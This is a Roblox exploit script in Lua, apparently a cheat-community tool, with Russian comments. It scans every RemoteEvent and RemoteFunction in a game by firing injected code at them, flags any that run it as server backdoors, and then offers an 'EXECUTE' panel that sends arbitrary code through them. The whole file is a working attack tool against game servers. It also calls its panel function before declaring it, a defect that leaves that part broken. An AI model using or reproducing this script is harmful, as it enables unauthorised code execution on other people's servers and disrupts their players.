--█████▄  ▄▄▄ ▄▄▄▄▄▄ ██  ██ ▄▄▄▄  ▄▄     ▄▄▄  ▄▄ ▄▄▄▄▄▄   ██      ▄▄▄   ▄▄▄  ▄▄▄▄  ▄▄▄▄▄ ▄▄▄▄   ██   ██████ ▄▄  ▄▄   ▄▄  ▄▄▄  ▄▄ ▄▄   ▀█▄ 
--██▄▄██ ██▀██  ██    ████  ██▄█▀ ██    ██▀██ ██   ██     ██     ██▀██ ██▀██ ██▀██ ██▄▄  ██▀██  ██   ██▄▄   ███▄██   ██ ██▀██ ▀███▀ ▀  ██ 
--██▄▄█▀ ██▀██  ██   ██  ██ ██    ██▄▄▄ ▀███▀ ██   ██     ██████ ▀███▀ ██▀██ ████▀ ██▄▄▄ ████▀  ▄▄   ██▄▄▄▄ ██ ▀██ ▄▄█▀ ▀███▀   █   ▄ ▄█▀ 

print("BatXploit Lalol Hub Style Scanner - FIXED PANEL")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LalolScanner"
screenGui.Parent = game:GetService("CoreGui")
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 550, 0, 650)
mainFrame.Position = UDim2.new(0.5, -275, 0.5, -325)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
title.Text = "BatXploit | Lalol Hub Style Scanner"
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 18
title.Parent = mainFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0, 25)
statusLabel.Position = UDim2.new(0, 10, 0, 50)
statusLabel.Text = "Status: Ready"
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = mainFrame

local scanBtn = Instance.new("TextButton")
scanBtn.Size = UDim2.new(0, 160, 0, 35)
scanBtn.Position = UDim2.new(0, 10, 0, 85)
scanBtn.Text = "Start Scan"
scanBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
scanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
scanBtn.BorderSizePixel = 1
scanBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
scanBtn.Parent = mainFrame

local clearBtn = Instance.new("TextButton")
clearBtn.Size = UDim2.new(0, 100, 0, 35)
clearBtn.Position = UDim2.new(0, 180, 0, 85)
clearBtn.Text = "Clear"
clearBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
clearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
clearBtn.BorderSizePixel = 1
clearBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
clearBtn.Parent = mainFrame

local resultFrame = Instance.new("ScrollingFrame")
resultFrame.Size = UDim2.new(1, -20, 0, 420)
resultFrame.Position = UDim2.new(0, 10, 0, 130)
resultFrame.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
resultFrame.BorderSizePixel = 1
resultFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
resultFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
resultFrame.ScrollBarThickness = 8
resultFrame.Parent = mainFrame

local resultLayout = Instance.new("UIListLayout")
resultLayout.Padding = UDim.new(0, 5)
resultLayout.Parent = resultFrame

local foundBackdoors = {}
local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}

local function addResult(text, color, bold)
    local label = Instance.new("TextLabel")
    label.Text = text
    label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
    label.TextSize = 12
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextWrapped = true
    label.Size = UDim2.new(1, -10, 0, 20)
    label.BackgroundTransparency = 1
    if bold then
        label.Font = Enum.Font.SourceSansBold
    end
    label.Parent = resultFrame
    task.wait()
    resultFrame.CanvasSize = UDim2.new(0, 0, 0, resultLayout.AbsoluteContentSize.Y)
end

local function generateRandomName(length)
    local text = ''
    for i = 1, length do
        text = text .. alphabet[math.random(1, #alphabet)]
    end
    return text
end

local function runRemote(remote, data)
    pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(data)
        elseif remote:IsA("RemoteFunction") then
            remote:InvokeServer(data)
        end
    end)
end

local function notify(text)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "BatXploit",
        Text = text,
        Duration = 4
    })
end

-- Тест одного remote
local function testRemote(remote, remotePath)
    local testName = generateRandomName(math.random(12, 30))
    runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. testName .. "'")
    for _ = 1, 10 do
        task.wait(0.1)
        if workspace:FindFirstChild(testName) then
            workspace[testName]:Destroy()
            addResult("✅ BACKDOOR CONFIRMED: " .. remotePath, Color3.fromRGB(0, 255, 0), true)
            return true
        end
    end
    return false
end

-- Защищённый бэкдор
local function checkProtectedBackdoor()
    local protectedName = "lh" .. game.PlaceId / 6666 * 1337 * game.PlaceId
    local protectedRemote = game:GetService("ReplicatedStorage"):FindFirstChild(protectedName)
    if protectedRemote and protectedRemote:IsA("RemoteFunction") then
        addResult("🔒 PROTECTED BACKDOOR FOUND: " .. protectedRemote:GetFullName(), Color3.fromRGB(255, 200, 0), true)
        table.insert(foundBackdoors, {remote = protectedRemote, path = protectedRemote:GetFullName()})
        return true
    end
    return false
end

-- Сканирование
local function scanAllRemotes()
    foundBackdoors = {}
    addResult("🔍 STARTING LALOL HUB STYLE SCAN", Color3.fromRGB(0, 255, 0), true)
    checkProtectedBackdoor()
    
    local allRemotes = {}
    for _, obj in ipairs(game:GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
            local fullName = obj:GetFullName()
            if not fullName:find("RobloxReplicatedStorage") and not fullName:find("DefaultChatSystemChatEvents") then
                table.insert(allRemotes, obj)
            end
        end
    end
    
    addResult("📡 Found " .. #allRemotes .. " remotes to test", Color3.fromRGB(255, 255, 0), false)
    
    for i, remote in ipairs(allRemotes) do
        statusLabel.Text = "Testing " .. i .. "/" .. #allRemotes
        if testRemote(remote, remote:GetFullName()) then
            table.insert(foundBackdoors, {remote = remote, path = remote:GetFullName()})
        end
        task.wait(0.05)
    end
    
    statusLabel.Text = "Scan complete. Found " .. #foundBackdoors .. " backdoors"
    addResult("✅ SCAN COMPLETED! Found " .. #foundBackdoors .. " backdoors", Color3.fromRGB(0, 255, 0), true)
    
    -- ПРИНУДИТЕЛЬНОЕ СОЗДАНИЕ ПАНЕЛИ, если есть бэкдоры
    if #foundBackdoors > 0 then
        -- Небольшая задержка для гарантии
        task.wait(0.5)
        createControlPanel()
        notify("Found " .. #foundBackdoors .. " backdoor(s)! Use the panel below.")
    else
        notify("No backdoors found.")
    end
end

-- СОЗДАНИЕ ПАНЕЛИ УПРАВЛЕНИЯ (с отладкой)
local function createControlPanel()
    -- Удаляем старую панель, если есть
    local oldPanel = mainFrame:FindFirstChild("ControlPanel")
    if oldPanel then oldPanel:Destroy() end
    
    addResult("🛠️ Creating control panel for " .. #foundBackdoors .. " backdoor(s)...", Color3.fromRGB(255, 255, 0), false)
    
    local controlFrame = Instance.new("Frame")
    controlFrame.Name = "ControlPanel"
    controlFrame.Size = UDim2.new(1, -20, 0, 100)
    controlFrame.Position = UDim2.new(0, 10, 1, -110)
    controlFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
    controlFrame.BorderSizePixel = 2
    controlFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    controlFrame.Parent = mainFrame
    
    local execTitle = Instance.new("TextLabel")
    execTitle.Size = UDim2.new(1, 0, 0, 20)
    execTitle.Text = "💀 BACKDOOR EXECUTION PANEL (select remote below) 💀"
    execTitle.TextColor3 = Color3.fromRGB(255, 0, 0)
    execTitle.BackgroundTransparency = 1
    execTitle.Font = Enum.Font.SourceSansBold
    execTitle.Parent = controlFrame
    
    -- Выпадающий список для выбора бэкдора
    local dropdown = Instance.new("TextBox")
    dropdown.Size = UDim2.new(0, 200, 0, 25)
    dropdown.Position = UDim2.new(0, 10, 0, 25)
    dropdown.PlaceholderText = "Select backdoor (click to copy)"
    dropdown.Text = foundBackdoors[1].path
    dropdown.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
    dropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
    dropdown.Parent = controlFrame
    
    -- Кнопка для копирования пути
    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(0, 60, 0, 25)
    copyBtn.Position = UDim2.new(0, 220, 0, 25)
    copyBtn.Text = "Copy"
    copyBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
    copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyBtn.BorderSizePixel = 1
    copyBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
    copyBtn.Parent = controlFrame
    copyBtn.MouseButton1Click:Connect(function()
        setclipboard(dropdown.Text)
        addResult("📋 Copied path: " .. dropdown.Text, Color3.fromRGB(200, 200, 0), false)
    end)
    
    -- Поле для ввода кода
    local execBox = Instance.new("TextBox")
    execBox.Size = UDim2.new(0, 350, 0, 40)
    execBox.Position = UDim2.new(0, 10, 0, 55)
    execBox.Text = "print('BatXploit backdoor test')"
    execBox.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
    execBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    execBox.TextWrapped = true
    execBox.Parent = controlFrame
    
    local execBtn = Instance.new("TextButton")
    execBtn.Size = UDim2.new(0, 120, 0, 40)
    execBtn.Position = UDim2.new(0, 370, 0, 55)
    execBtn.Text = "EXECUTE"
    execBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
    execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    execBtn.BorderSizePixel = 2
    execBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
    execBtn.Font = Enum.Font.SourceSansBold
    execBtn.Parent = controlFrame
    
    execBtn.MouseButton1Click:Connect(function()
        local selectedPath = dropdown.Text
        local targetRemote = nil
        for _, bd in ipairs(foundBackdoors) do
            if bd.path == selectedPath then
                targetRemote = bd.remote
                break
            end
        end
        if targetRemote then
            runRemote(targetRemote, execBox.Text)
            addResult("💀 Executed on: " .. selectedPath, Color3.fromRGB(255, 50, 50), false)
            notify("Executed code on selected backdoor")
        else
            addResult("❌ Remote not found in list", Color3.fromRGB(255, 0, 0), false)
        end
    end)
    
    addResult("🔥 CONTROL PANEL CREATED! Select backdoor and execute code.", Color3.fromRGB(0, 255, 0), true)
end

-- Drag & Drop
local function dragify(frame)
    local dragToggle, dragInput, dragStart, startPos
    local UIS = game:GetService("UserInputService")
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:GetFocusedTextBox() == nil then
            dragToggle = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                end
            end)
        end
    end)
    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragToggle then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end
dragify(mainFrame)

scanBtn.MouseButton1Click:Connect(scanAllRemotes)
clearBtn.MouseButton1Click:Connect(function()
    for _, child in ipairs(resultFrame:GetChildren()) do
        if child:IsA("TextLabel") then
            child:Destroy()
        end
    end
    foundBackdoors = {}
    addResult("Results cleared", Color3.fromRGB(255, 255, 0), false)
end)

game:GetService("UserInputService").InputBegan:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.LeftAlt and not processed then
        mainFrame.Visible = not mainFrame.Visible
    end
end)

notify("Lalol Hub Style Scanner loaded (fixed panel)")
addResult("🔥 BatXploit Lalol Hub Style Scanner (FIXED) 🔥", Color3.fromRGB(255, 0, 0), true)
addResult("📌 Method: creates a model in workspace to confirm backdoor", Color3.fromRGB(255, 255, 0), false)
addResult("📌 Press Left Alt to show/hide", Color3.fromRGB(255, 255, 0), false)
